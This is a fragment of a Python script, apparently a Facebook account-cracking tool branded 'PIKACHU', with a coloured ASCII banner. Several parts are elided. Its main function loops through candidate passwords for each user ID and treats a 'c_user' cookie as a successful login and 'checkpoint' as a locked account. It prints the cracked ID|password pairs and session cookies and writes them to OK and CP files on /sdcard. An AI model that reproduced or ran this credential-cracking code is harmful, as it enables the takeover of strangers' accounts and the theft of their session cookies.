...
\033[38;1m    ____  ______ __ ___   ________  ____  __
\033[35;1m   / __ \/  _/ //_//   | / ____/ / / / / / /
\033[36;1m  / /_/ // // ,<  / /| |/ /   / /_/ / / / / 
\033[36;1m / ____// // /| |/ ___ / /___/ __  / /_/ /  
\033[34;1m/_/   /___/_/ |_/_/  |_\____/_/ /_/\____/ """)
...
def fuck():
    ...
    print(' [✓] OK Ids saved as 🌹PIKACHU💔-OK.txt')
    print(' [✓] CP Id Save as 🌹PIKACHU💔-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[🌹PIKACHU💔]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[🌹PIKACHU💔-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/🌹PIKACHU💔-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[🌹PIKACHU💔-CP] {cid}|{ps}")
                open('/sdcard/🌹PIKACHU💔-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
